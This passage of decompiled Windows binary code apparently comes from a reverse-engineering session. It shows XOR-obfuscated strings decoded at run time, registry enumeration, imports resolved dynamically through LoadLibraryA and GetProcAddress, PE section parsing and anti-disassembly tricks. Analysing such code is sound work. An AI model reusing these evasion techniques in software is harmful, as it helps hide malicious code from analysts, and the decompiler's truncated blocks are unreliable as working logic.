      do {
        pcVar5 = param_1;
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        pcVar5 = param_1 + 1;
        cVar1 = *param_1;
        param_1 = pcVar5;
      } while (cVar1 != '\0');
      uVar3 = ~uVar3;
      pcVar5 = pcVar5 + -uVar3;
      pcVar6 = pcVar2;
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined4 *)pcVar6 = *(undefined4 *)pcVar5;
        pcVar5 = pcVar5 + 4;
        pcVar6 = pcVar6 + 4;
      }
      for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
        *pcVar6 = *pcVar5;
        pcVar5 = pcVar5 + 1;
        pcVar6 = pcVar6 + 1;
      }
      return pcVar2;
    }
  }
  return (char *)0x0;
}



/* VA 0041e820 */

void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    /* WARNING: Could not recover jumptable at 0x0041e820. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



/* VA 0041f000 */

/* WARNING: Instruction at (ram,0x0041f0da) overlaps instruction at (ram,0x0041f0d9)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0041f0c7) */
/* WARNING: Removing unreachable block (ram,0x0041f090) */
/* WARNING: Removing unreachable block (ram,0x0041f064) */
/* WARNING: Removing unreachable block (ram,0x0041f04c) */
/* WARNING: Removing unreachable block (ram,0x0041f040) */
/* WARNING: Removing unreachable block (ram,0x0041f058) */
/* WARNING: Removing unreachable block (ram,0x0041f084) */
/* WARNING: Removing unreachable block (ram,0x0041f0bb) */
/* WARNING: Removing unreachable block (ram,0x0041f0d3) */

uint FUN_0041f000(void)

{
  LPCSTR lpSubKey;
  LSTATUS LVar1;
  undefined2 extraout_var;
  undefined2 uVar2;
  CHAR extraout_DL;
  bool bVar3;
  undefined2 uVar4;
  HKEY local_8;

  uVar4 = 0;
  lpSubKey = FUN_00420230(&DAT_00429198);
  uVar2 = 0;
  if (lpSubKey != (LPCSTR)0x0) {
    LVar1 = RegOpenKeyA((HKEY)0x80000002,lpSubKey,&local_8);
    if (LVar1 == 0) {
      FUN_0041f0e0((LPDWORD)&stack0xfffffff4,local_8,local_8,(undefined2 *)&stack0xfffffff4);
      bVar3 = (POPCOUNT((uint)&local_8 & 0xff) & 1U) == 0;
      RegCloseKey(local_8);
      uVar4 = SUB42(local_8,0);
      if ((!bVar3) && (bVar3)) {
        lpSubKey[-0x18] = extraout_DL;
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
    }
    FUN_00414d40(lpSubKey);
    uVar2 = extraout_var;
  }
  return CONCAT22(uVar2,uVar4);
}



/* VA 0041f0e0 */

/* WARNING: Instruction at (ram,0x0041f1d4) overlaps instruction at (ram,0x0041f1d3)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0041f13a) */
/* WARNING: Removing unreachable block (ram,0x0041f18a) */
/* WARNING: Removing unreachable block (ram,0x0041f103) */
/* WARNING: Removing unreachable block (ram,0x0041f12e) */
/* WARNING: Removing unreachable block (ram,0x0041f1e3) */
/* WARNING: Removing unreachable block (ram,0x0041f1ef) */
/* WARNING: Removing unreachable block (ram,0x0041f1c6) */
/* WARNING: Removing unreachable block (ram,0x0041f146) */
/* WARNING: Removing unreachable block (ram,0x0041f1a1) */
/* WARNING: Removing unreachable block (ram,0x0041f1a5) */
/* WARNING: Removing unreachable block (ram,0x0041f1d2) */
/* WARNING: Removing unreachable block (ram,0x0041f1fb) */
/* WARNING: Removing unreachable block (ram,0x0041f20f) */

uint __fastcall FUN_0041f0e0(LPDWORD param_1,undefined4 param_2,HKEY param_3,undefined2 *param_4)

{
  HKEY hKey;
  short sVar1;
  uint uVar2;
  LPDWORD pDVar3;
  PFILETIME unaff_EBX;
  DWORD dwIndex;
  LPDWORD unaff_ESI;
  LPSTR unaff_EDI;
  bool bVar4;
  HKEY__ local_314 [128];
  BYTE aBStack_114 [268];
  DWORD DStack_8;

  hKey = param_3;
  dwIndex = 0;
  while( true ) {
    param_3 = (HKEY)0x200;
    uVar2 = RegEnumKeyExA(hKey,dwIndex,(LPSTR)local_314,(LPDWORD)&param_3,(LPDWORD)0x0,unaff_EDI,
                          unaff_ESI,unaff_EBX);
    if (uVar2 != 0) {
      return uVar2;
    }
                    /* WARNING: Bad instruction - Truncating control flow here */
    DStack_8 = 0x104;
    pDVar3 = FUN_0041f2c0(hKey,local_314,aBStack_114,&DStack_8);
    bVar4 = (POPCOUNT((uint)&stack0xfffffce0 & 0xff) & 1U) == 0;
    if ((!bVar4) && (bVar4)) break;
    if (pDVar3 == (LPDWORD)0x0) {
      aBStack_114[DStack_8] = '\0';
                    /* WARNING: Bad instruction - Truncating control flow here */
      sVar1 = FUN_0041f220((char *)aBStack_114);
      if (sVar1 != 0) {
        *param_4 = 1;
        return 0;
      }
    }
    dwIndex = dwIndex + 1;
  }
  *(int *)(dwIndex + 4) = *(int *)(dwIndex + 4) >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* VA 0041f220 */

/* WARNING: Instruction at (ram,0x0041f2b7) overlaps instruction at (ram,0x0041f2b5)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0041f24c) */
/* WARNING: Removing unreachable block (ram,0x0041f25a) */
/* WARNING: Removing unreachable block (ram,0x0041f25e) */
/* WARNING: Removing unreachable block (ram,0x0041f240) */
/* WARNING: Removing unreachable block (ram,0x0041f26d) */
/* WARNING: Removing unreachable block (ram,0x0041f287) */
/* WARNING: Removing unreachable block (ram,0x0041f28b) */
/* WARNING: Removing unreachable block (ram,0x0041f2a8) */
/* WARNING: Removing unreachable block (ram,0x0041f2b4) */

undefined2 __cdecl FUN_0041f220(char *param_1)

{
  char *pcVar1;
  byte *pbVar2;
  uint uVar3;
  DWORD DVar4;
  undefined2 uVar5;

  uVar5 = 0;
  pcVar1 = _strrchr(param_1,0x5c);
  pbVar2 = (byte *)param_1;
  if (pcVar1 != (char *)0x0) {
    pbVar2 = (byte *)(pcVar1 + 1);
  }
  uVar3 = FUN_0042026c((char *)0x4291d0,pbVar2);
  if ((uVar3 == 0) && (DVar4 = GetFileAttributesA(param_1), DVar4 != 0xffffffff)) {
    uVar5 = 1;
  }
                    /* WARNING: Bad instruction - Truncating control flow here */
  return uVar5;
}



/* VA 0041f2c0 */

/* WARNING: Instruction at (ram,0x0041f374) overlaps instruction at (ram,0x0041f372)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0041f36d) */
/* WARNING: Removing unreachable block (ram,0x0041f31f) */
/* WARNING: Removing unreachable block (ram,0x0041f302) */
/* WARNING: Removing unreachable block (ram,0x0041f2f6) */
/* WARNING: Removing unreachable block (ram,0x0041f313) */
/* WARNING: Removing unreachable block (ram,0x0041f384) */
/* WARNING: Removing unreachable block (ram,0x0041f30f) */
/* WARNING: Removing unreachable block (ram,0x0041f390) */
/* WARNING: Removing unreachable block (ram,0x0041f39c) */

LPDWORD __cdecl FUN_0041f2c0(HKEY param_1,HKEY param_2,LPBYTE param_3,LPDWORD param_4)

{
  LPDWORD pDVar1;
  LPCSTR lpValueName;
  byte bVar2;
  undefined1 in_PF;
  bool bVar3;

  pDVar1 = (LPDWORD)RegOpenKeyExA(param_1,(LPCSTR)param_2,0,0x20019,&param_2);
  if ((!(bool)in_PF) && ((bool)in_PF)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  if (pDVar1 == (LPDWORD)0x0) {
    lpValueName = FUN_00420230(&DAT_004291c0);
    bVar2 = 0;
    bVar3 = (POPCOUNT((uint)lpValueName & 0xff) & 1U) == 0;
    if (lpValueName != (LPCSTR)0x0) {
      pDVar1 = (LPDWORD)RegQueryValueExA(param_2,lpValueName,(LPDWORD)0x0,(LPDWORD)&param_1,param_3,
                                         param_4);
      if ((!bVar3) && (bVar3)) {
        *(uint *)(lpValueName + -0x18) = *(int *)(lpValueName + -0x18) + -0x1f + (uint)bVar2;
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
      FUN_00414d40(lpValueName);
    }
    RegCloseKey(param_2);
  }
  return pDVar1;
}



/* VA 0041f3e0 */

uint __cdecl
FUN_0041f3e0(undefined4 *param_1,undefined4 param_2,uint param_3,undefined4 *param_4,uint *param_5,
            uint *param_6,uint *param_7)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  undefined4 local_160 [2];
  uint local_158;
  uint local_154;
  uint local_150;
  undefined4 local_14c;
  int local_138;
  uint local_132;
  uint local_124;
  uint local_c0;
  uint local_b8;
  uint local_b0;
  uint local_ac;
  uint local_98;
  uint local_94;
  uint local_78;
  uint local_60;
  undefined4 local_40 [15];
  int local_4;

  FUN_0041fb40(param_1,local_40,&local_138);
  uVar1 = local_4 + 0x18 + (local_124 & 0xffff);
  uVar2 = uVar1 + (local_132 & 0xffff) * 0x28;
  if (param_3 != 0) {
    uVar1 = param_3;
  }
  *param_4 = 0;
  *param_5 = 0;
  *param_6 = 0;
  switch(param_2) {
  case 1:
    uVar1 = FUN_0041fbf0(param_1,0x20000020,0x20000020,uVar1,uVar2,local_160);
LAB_0041f5de:
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      uVar2 = FUN_0041fd90((int)local_160);
      *param_5 = uVar2;
      return uVar1;
    }
    break;
  case 2:
    while (uVar1 = FUN_0041fbf0(param_1,0xc0000040,0xc0000040,uVar1,uVar2,local_160), uVar1 != 0) {
      uVar3 = FUN_0041f9b0(local_154,param_1);
      if ((char)uVar3 == '\0') {
        if (uVar1 == 0) {
          return 0;
        }
        *param_4 = local_14c;
        *param_6 = local_154;
        uVar2 = FUN_0041fd90((int)local_160);
        *param_5 = uVar2;
        return uVar1;
      }
      uVar1 = uVar1 + 0x28;
    }
    break;
  case 3:
    uVar1 = FUN_0041fc50(param_1,&DAT_0042a970,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      uVar2 = FUN_0041fd90((int)local_160);
      *param_5 = uVar2;
      return uVar1;
    }
    break;
  default:
    *param_4 = 0;
    *param_5 = 0;
    *param_6 = 0;
    break;
  case 5:
    uVar1 = FUN_0041fb90(param_1,local_b0,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      *param_5 = local_ac;
      return uVar1;
    }
    break;
  case 6:
    uVar1 = FUN_0041fb90(param_1,local_b8,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      *param_5 = local_158;
      if (local_158 == 0) {
        *param_5 = local_150;
      }
      *param_7 = local_b8;
      return uVar1;
    }
    break;
  case 7:
    uVar1 = FUN_0041fb90(param_1,local_c0,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      uVar2 = FUN_0041fd90((int)local_160);
      *param_5 = uVar2;
      *param_7 = local_c0;
      return uVar1;
    }
    break;
  case 8:
    uVar1 = FUN_0041fb90(param_1,local_98,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      *param_5 = local_94;
      return uVar1;
    }
    if (local_98 != 0) {
      *param_4 = 0;
      *param_6 = local_98;
      *param_5 = local_94;
      return 0;
    }
    break;
  case 9:
    uVar1 = FUN_0041fb90(param_1,local_78,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      uVar2 = FUN_0041fd90((int)local_160);
      *param_5 = uVar2;
      *param_7 = local_78;
      return uVar1;
    }
    break;
  case 10:
    while( true ) {
      uVar1 = FUN_0041fbf0(param_1,0x40000040,0xc0000060,uVar1,uVar2,local_160);
      if (uVar1 == 0) break;
      uVar3 = FUN_0041f9b0(local_154,param_1);
      if ((char)uVar3 == '\0') goto LAB_0041f5de;
      uVar1 = uVar1 + 0x28;
    }
    break;
  case 0xb:
    uVar1 = FUN_0041fb90(param_1,local_60,uVar1,uVar2,local_160);
    if (uVar1 != 0) {
      *param_4 = local_14c;
      *param_6 = local_154;
      uVar2 = FUN_0041fd90((int)local_160);
      *param_5 = uVar2;
      *param_7 = local_60;
      return uVar1;
    }
  }
  return 0;
}



/* VA 0041f970 */

void __cdecl FUN_0041f970(undefined4 *param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 local_138 [16];
  int local_f8 [30];
  undefined4 local_80 [32];

  FUN_0041fb40(param_1,local_138,local_f8);
  puVar2 = local_80;
  for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
    *param_2 = *puVar2;
    puVar2 = puVar2 + 1;
    param_2 = param_2 + 1;
  }
  return;
}



/* VA 0041f9b0 */

uint __cdecl FUN_0041f9b0(int param_1,undefined4 *param_2)

{
  uint uVar1;
  int *piVar2;
  int local_80 [32];

  FUN_0041f970(param_2,local_80);
  piVar2 = local_80;
  uVar1 = 0;
  do {
    if (param_1 == *piVar2) {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    uVar1 = uVar1 + 1;
    piVar2 = piVar2 + 2;
  } while (uVar1 < 0x10);
  return uVar1 & 0xffffff00;
}



/* VA 0041fa00 */

void __cdecl
FUN_0041fa00(undefined4 *param_1,undefined4 param_2,uint param_3,undefined4 *param_4,uint *param_5,
            uint *param_6)

{
  FUN_0041f3e0(param_1,param_2,param_3,param_4,param_5,param_6,(uint *)&param_6);
  return;
}



/* VA 0041fa30 */

void __cdecl
FUN_0041fa30(undefined4 *param_1,undefined4 param_2,undefined4 *param_3,uint *param_4,uint *param_5)

{
  FUN_0041fa00(param_1,param_2,0,param_3,param_4,param_5);
  return;
}



/* VA 0041fb40 */

bool __cdecl FUN_0041fb40(undefined4 *param_1,undefined4 *param_2,int *param_3)

{
  FUN_00411eb0(param_1,0,(undefined4 *)0x40,param_2);
  FUN_00411eb0(param_1,param_2[0xf],(undefined4 *)0xf8,param_3);
  return *param_3 == 0x4550;
}



/* VA 0041fb90 */

uint __cdecl
FUN_0041fb90(undefined4 *param_1,uint param_2,uint param_3,uint param_4,undefined4 *param_5)

{
  int iVar1;

  if (param_4 <= param_3) {
    return 0;
  }
  while( true ) {
    FUN_00411eb0(param_1,param_3,(undefined4 *)0x28,param_5);
    iVar1 = param_5[2];
    if (iVar1 == 0) {
      iVar1 = param_5[4];
    }
    if (((uint)param_5[3] <= param_2) && (param_2 < (uint)(iVar1 + param_5[3]))) break;
    param_3 = param_3 + 0x28;
    if (param_4 <= param_3) {
      return 0;
    }
  }
  return param_3;
}



/* VA 0041fbf0 */

uint __cdecl
FUN_0041fbf0(undefined4 *param_1,uint param_2,uint param_3,uint param_4,uint param_5,
            undefined4 *param_6)

{
  if (param_5 <= param_4) {
    return 0;
  }
  do {
    FUN_00411eb0(param_1,param_4,(undefined4 *)0x28,param_6);
    if ((param_3 & param_6[9]) == param_2) {
      return param_4;
    }
    param_4 = param_4 + 0x28;
  } while (param_4 < param_5);
  return 0;
}



/* VA 0041fc50 */

uint __cdecl
FUN_0041fc50(undefined4 *param_1,byte *param_2,uint param_3,uint param_4,undefined4 *param_5)

{
  byte bVar1;
  byte *pbVar2;
  int iVar3;
  byte *pbVar4;
  bool bVar5;
  undefined4 local_c;
  undefined4 local_8;
  undefined1 local_4;

  if (param_4 <= param_3) {
    return 0;
  }
  do {
    FUN_00411eb0(param_1,param_3,(undefined4 *)0x28,param_5);
    local_c = *param_5;
    local_8 = param_5[1];
    local_4 = 0;
    pbVar2 = (byte *)&local_c;
    pbVar4 = param_2;
    do {
      bVar1 = *pbVar2;
      bVar5 = bVar1 < *pbVar4;
      if (bVar1 != *pbVar4) {
LAB_0041fcc5:
        iVar3 = (1 - (uint)bVar5) - (uint)(bVar5 != 0);
        goto LAB_0041fcca;
      }
      if (bVar1 == 0) break;
      bVar1 = pbVar2[1];
      bVar5 = bVar1 < pbVar4[1];
      if (bVar1 != pbVar4[1]) goto LAB_0041fcc5;
      pbVar2 = pbVar2 + 2;
      pbVar4 = pbVar4 + 2;
    } while (bVar1 != 0);
    iVar3 = 0;
LAB_0041fcca:
    if (iVar3 == 0) {
      return param_3;
    }
    param_3 = param_3 + 0x28;
    if (param_4 <= param_3) {
      return 0;
    }
  } while( true );
}



/* VA 0041fd00 */

bool __cdecl FUN_0041fd00(undefined4 *param_1,int param_2,byte *param_3)

{
  byte bVar1;
  byte *pbVar2;
  bool bVar3;
  undefined4 local_34;
  undefined4 local_30;
  undefined1 local_2c;
  undefined4 local_28;
  undefined4 local_24;

  FUN_00411eb0(param_1,param_2,(undefined4 *)0x28,&local_28);
  local_34 = local_28;
  local_30 = local_24;
  local_2c = 0;
  pbVar2 = (byte *)&local_34;
  while( true ) {
    bVar1 = *param_3;
    bVar3 = bVar1 < *pbVar2;
    if (bVar1 != *pbVar2) break;
    if (bVar1 == 0) {
      return true;
    }
    bVar1 = param_3[1];
    bVar3 = bVar1 < pbVar2[1];
    if (bVar1 != pbVar2[1]) break;
    param_3 = param_3 + 2;
    pbVar2 = pbVar2 + 2;
    if (bVar1 == 0) {
      return true;
    }
  }
  return 1 - bVar3 == (uint)(bVar3 != 0);
}



/* VA 0041fd90 */

uint __cdecl FUN_0041fd90(int param_1)

{
  uint uVar1;

  uVar1 = *(uint *)(param_1 + 8);
  if (uVar1 == 0) {
    uVar1 = *(uint *)(param_1 + 0x10);
  }
  else if (*(uint *)(param_1 + 0x10) <= uVar1) {
    return *(uint *)(param_1 + 0x10);
  }
  return uVar1;
}



/* VA 0041fdb0 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x0041fdf9) overlaps instruction at (ram,0x0041fdf8)
    */
/* WARNING: Removing unreachable block (ram,0x0041fe17) */
/* WARNING: Removing unreachable block (ram,0x0041fe07) */
/* WARNING: Removing unreachable block (ram,0x0041fe0b) */

void __cdecl FUN_0041fdb0(char *param_1)

{
  LPCSTR lpLibFileName;
  bool bVar1;

  if (param_1 != (char *)0x0) {
    lpLibFileName = FUN_00420230(param_1);
    bVar1 = (POPCOUNT((uint)lpLibFileName & 0xff) & 1U) == 0;
    if (lpLibFileName != (LPCSTR)0x0) {
      LoadLibraryA(lpLibFileName);
      if ((!bVar1) && (bVar1)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
      FUN_00414d40(lpLibFileName);
    }
  }
  return;
}



/* VA 0041fe22 */

/* WARNING: Instruction at (ram,0x0041fe6b) overlaps instruction at (ram,0x0041fe6a)
    */
/* WARNING: Removing unreachable block (ram,0x0041fe79) */
/* WARNING: Removing unreachable block (ram,0x0041fe7d) */
/* WARNING: Removing unreachable block (ram,0x0041fe65) */
/* WARNING: Removing unreachable block (ram,0x0041fe89) */

void __thiscall FUN_0041fe22(byte param_1,char *param_2)

{
  LPCSTR lpModuleName;

  if ((param_2 != (char *)0x0) &&
     (lpModuleName = FUN_00420230(param_2), lpModuleName != (LPCSTR)0x0)) {
    GetModuleHandleA(lpModuleName);
    FUN_00414d40(lpModuleName);
  }
  return;
}



/* VA 0041fe94 */

/* WARNING: Instruction at (ram,0x0041feee) overlaps instruction at (ram,0x0041feec)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0041fec4) */
/* WARNING: Removing unreachable block (ram,0x0041fefb) */
/* WARNING: Removing unreachable block (ram,0x0041fec0) */
/* WARNING: Removing unreachable block (ram,0x0041feff) */
/* WARNING: Removing unreachable block (ram,0x0041ff0b) */

void __thiscall FUN_0041fe94(ushort param_1,HMODULE param_2,char *param_3)

{
  LPCSTR lpProcName;
  int unaff_EBX;
  bool bVar1;

  if (param_2 != (HMODULE)0x0) {
    lpProcName = FUN_00420230(param_3);
    bVar1 = (POPCOUNT((uint)lpProcName & 0xff) & 1U) == 0;
    if (lpProcName != (LPCSTR)0x0) {
      GetProcAddress(param_2,lpProcName);
      if ((!bVar1) && (bVar1)) {
        *(byte *)(unaff_EBX + -0x17af07bb) = *(byte *)(unaff_EBX + -0x17af07bb) | 0x4f;
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
      FUN_00414d40(lpProcName);
    }
  }
  return;
}



/* VA 0041ff16 */

/* WARNING: Instruction at (ram,0x0041ff5b) overlaps instruction at (ram,0x0041ff5a)
    */
/* WARNING: Removing unreachable block (ram,0x0041ff55) */
/* WARNING: Removing unreachable block (ram,0x0041ff51) */
/* WARNING: Removing unreachable block (ram,0x0041ff7a) */

undefined4 __thiscall FUN_0041ff16(byte param_1,char *param_2,char *param_3)

{
  byte *pbVar1;
  ushort extraout_CX;
  ushort extraout_CX_00;
  ushort uVar2;
  int unaff_EBX;
  bool bVar3;
  bool bVar4;
  HMODULE local_c;
  undefined4 uVar5;

  uVar5 = 0;
  local_c = (HMODULE)FUN_0041fe22(param_1,param_2);
  uVar2 = extraout_CX;
  if (local_c == (HMODULE)0x0) {
    local_c = (HMODULE)FUN_0041fdb0(param_2);
    uVar2 = extraout_CX_00;
  }
  bVar4 = local_c != (HMODULE)0x0;
  bVar3 = (POPCOUNT((uint)local_c & 0xff) & 1U) != 0;
  if (bVar4) {
    uVar5 = FUN_0041fe94(uVar2,local_c,param_3);
  }
  if ((bVar4 || bVar3) && (!bVar4 && !bVar3)) {
    pbVar1 = (byte *)(unaff_EBX + 0x5e5ffc45);
    *pbVar1 = *pbVar1 >> 1 | *pbVar1 << 7;
  }
  return uVar5;
}



/* VA 0041ff91 */

bool FUN_0041ff91(void)

{
  HMODULE pHVar1;
  ushort extraout_CX;
  ushort uVar2;
  ushort extraout_CX_01;
  ushort extraout_CX_02;
  ushort extraout_CX_03;
  ushort extraout_CX_04;
  ushort extraout_CX_05;
  bool bVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  bool bVar7;
  bool bVar8;
  bool bVar9;
  bool bVar10;
  bool bVar11;
  bool local_c;
  ushort extraout_CX_00;

  pHVar1 = (HMODULE)FUN_0041fdb0(&DAT_0042a9c8);
  if (pHVar1 == (HMODULE)0x0) {
    local_c = false;
  }
  else {
    DAT_0042e9f8 = FUN_0041fe94(extraout_CX,pHVar1,&DAT_0042a9d8);
    bVar3 = DAT_0042e9f8 != 0;
    uVar2 = (ushort)pHVar1;
    DAT_0042e9fc = FUN_0041fe94(uVar2,pHVar1,&DAT_0042a9f0);
    bVar4 = DAT_0042e9fc != 0;
    DAT_0042ea00 = FUN_0041fe94(extraout_CX_00,pHVar1,&DAT_0042aa08);
    bVar5 = DAT_0042ea00 != 0;
    DAT_0042ea04 = FUN_0041fe94(extraout_CX_01,pHVar1,&DAT_0042aa18);
    bVar6 = DAT_0042ea04 != 0;
    DAT_0042ea08 = FUN_0041fe94(uVar2,pHVar1,&DAT_0042aa28);
    bVar7 = DAT_0042ea08 != 0;
    DAT_0042ea0c = FUN_0041fe94(extraout_CX_02,pHVar1,&DAT_0042aa38);
    bVar8 = DAT_0042ea0c != 0;
    DAT_0042ea10 = FUN_0041fe94(extraout_CX_03,pHVar1,&DAT_0042aa48);
    bVar9 = DAT_0042ea10 != 0;
    DAT_0042ea14 = FUN_0041fe94(uVar2,pHVar1,&DAT_0042aa58);
    bVar10 = DAT_0042ea14 != 0;
    DAT_0042ea18 = FUN_0041fe94(extraout_CX_04,pHVar1,&DAT_0042aa68);
    bVar11 = DAT_0042ea18 != 0;
    DAT_0042ea1c = FUN_0041fe94(extraout_CX_05,pHVar1,&DAT_0042aa80);
    local_c = DAT_0042ea1c != 0 &&
              (bVar11 &&
              (bVar10 && (bVar9 && (bVar8 && (bVar7 && (bVar6 && (bVar5 && (bVar4 && bVar3))))))));
  }
  return local_c;
}



/* VA 00420139 */

bool __cdecl FUN_00420139(int *param_1)

{
  int iVar1;
  ushort extraout_CX;
  bool bVar2;

  iVar1 = FUN_0041fdb0(&DAT_0042aa88);
  *param_1 = iVar1;
  if (*param_1 == 0) {
    bVar2 = false;
  }
  else {
    DAT_0042ea24 = FUN_0041fe94((ushort)(HMODULE)*param_1,(HMODULE)*param_1,&DAT_0042aa98);
    bVar2 = DAT_0042ea24 != 0;
    DAT_0042ea20 = FUN_0041fe94(extraout_CX,(HMODULE)*param_1,&DAT_0042aab0);
    bVar2 = DAT_0042ea20 != 0 && bVar2;
  }
  return bVar2;
}



/* VA 004201bb */

bool FUN_004201bb(void)

{
  bool bVar1;

  bVar1 = FUN_0041ff91();
  return bVar1;
}



/* VA 004201d0 */

undefined1 * __cdecl FUN_004201d0(undefined1 *param_1,undefined1 *param_2)

{
  int iVar1;
  int local_8;

  local_8 = 0;
  *param_1 = *param_2;
  while (param_2[local_8] != '\0') {
    iVar1 = local_8 + 1;
    param_1[iVar1] = param_2[iVar1] - 1 ^ param_1[local_8];
    local_8 = iVar1;
  }
  param_1[local_8] = 0;
  return param_1;
}



/* VA 00420230 */

undefined1 * __cdecl FUN_00420230(char *param_1)

{
  size_t sVar1;
  undefined1 *puVar2;

  sVar1 = _strlen(param_1);
  puVar2 = (undefined1 *)FUN_00414db0(sVar1 + 1);
  if (puVar2 != (undefined1 *)0x0) {
    FUN_004201d0(puVar2,param_1);
  }
  return puVar2;
}



/* VA 0042026c */

uint __cdecl FUN_0042026c(char *param_1,byte *param_2)

{
  byte *pbVar1;
  undefined4 local_c;

  pbVar1 = FUN_00420230(param_1);
  if (pbVar1 == (byte *)0x0) {
    local_c = 2;
  }
  else {
    local_c = FUN_0041dde0(pbVar1,param_2);
    FUN_00414d40(pbVar1);
  }
  return local_c;
}



/* VA 004202b6 */

undefined1 * __cdecl FUN_004202b6(undefined1 *param_1,undefined1 *param_2)

{
  int iVar1;
  int local_8;

  local_8 = 0;
  *param_2 = *param_1;
  while (param_1[local_8] != '\0') {
    iVar1 = local_8 + 1;
    param_2[iVar1] = (param_1[iVar1] ^ param_1[local_8]) + 1;
    local_8 = iVar1;
  }
  param_2[local_8] = 0;
  return param_2;
}



/* VA 00420316 */

undefined1 * __cdecl FUN_00420316(char *param_1)

{
  size_t sVar1;
  undefined1 *puVar2;

  sVar1 = _strlen(param_1);
  puVar2 = (undefined1 *)FUN_00414db0(sVar1 + 1);
  if (puVar2 != (undefined1 *)0x0) {
    FUN_004202b6(param_1,puVar2);
  }
  return puVar2;
}



/* VA 00420352 */

char * __cdecl FUN_00420352(char *param_1,char *param_2)

{
  char *_SubStr;
  undefined4 local_c;

  _SubStr = FUN_00420230(param_2);
  if (_SubStr == (char *)0x0) {
    local_c = (char *)0x0;
  }
  else {
    local_c = _strstr(param_1,_SubStr);
    FUN_00414d40(_SubStr);
  }
  return local_c;
}



/* VA 0042039c */

uint __cdecl FUN_0042039c(byte *param_1,char *param_2)

{
  byte *pbVar1;
  uint uVar2;
  uint uVar3;
  byte *local_14;
  byte *local_10;
  byte *local_c;

  pbVar1 = FUN_00420230(param_2);
  if (pbVar1 == (byte *)0x0) {
    local_c = (byte *)0x0;
  }
  else {
    for (local_c = param_1; *local_c != 0; local_c = local_c + 1) {
      local_10 = local_c;
      for (local_14 = pbVar1; *local_14 != 0; local_14 = local_14 + 1) {
        uVar2 = FUN_00414f30((uint)*local_14);
        uVar3 = FUN_00414f30((uint)*local_10);
        if (uVar2 != uVar3) break;
        local_10 = local_10 + 1;
      }
      if (*local_14 == 0) break;
    }
    local_c = (byte *)(-(uint)(*local_c != 0) & (uint)local_c);
    FUN_00414d40(pbVar1);
  }
  return (uint)local_c;
}



/* VA 00420470 */

/* WARNING: Instruction at (ram,0x004205a8) overlaps instruction at (ram,0x004205a6)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004205a2) */
/* WARNING: Removing unreachable block (ram,0x0042053a) */
/* WARNING: Removing unreachable block (ram,0x004204e5) */
/* WARNING: Removing unreachable block (ram,0x004204d9) */
/* WARNING: Removing unreachable block (ram,0x00420484) */
/* WARNING: Removing unreachable block (ram,0x00420490) */
/* WARNING: Removing unreachable block (ram,0x0042049c) */
/* WARNING: Removing unreachable block (ram,0x004204cd) */
/* WARNING: Removing unreachable block (ram,0x0042052e) */
/* WARNING: Removing unreachable block (ram,0x00420546) */
/* WARNING: Removing unreachable block (ram,0x004204f1) */
/* WARNING: Removing unreachable block (ram,0x00420552) */
/* WARNING: Removing unreachable block (ram,0x004204a8) */
/* WARNING: Removing unreachable block (ram,0x004204ae) */

uint __thiscall FUN_00420470(char param_1)

{
  uint uVar1;
  int in_stack_00000010;
  int in_stack_00000014;
  uint in_stack_00000018;
  uint uStack_18;
  int iStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;

  uStack_10 = in_stack_00000018;
  uVar1 = (in_stack_00000018 - 1) + in_stack_00000014;
  uStack_8 = uVar1;
  while( true ) {
    if (uStack_8 <= uStack_10) {
      return uVar1;
    }
    uStack_18 = uStack_8;
    uVar1 = FUN_004119a0(&stack0x00000004,&uStack_10,&uStack_18,3,1);
    if ((uVar1 & 0xffff) == 0) break;
    iStack_14 = uStack_10 - in_stack_00000018;
                    /* WARNING: Bad instruction - Truncating control flow here */
    iStack_c = (uStack_18 - uStack_10) + 1;
    while (iStack_c != 0) {
      *(undefined1 *)(in_stack_00000010 + iStack_14) = (undefined1)iStack_14;
      iStack_14 = iStack_14 + 1;
      iStack_c = iStack_c + -1;
    }
    uStack_10 = uStack_18 + 1;
    iStack_c = 0xffffffff;
    uVar1 = 0xffffffff;
  }
  return 0;
}



/* VA 004205b5 */

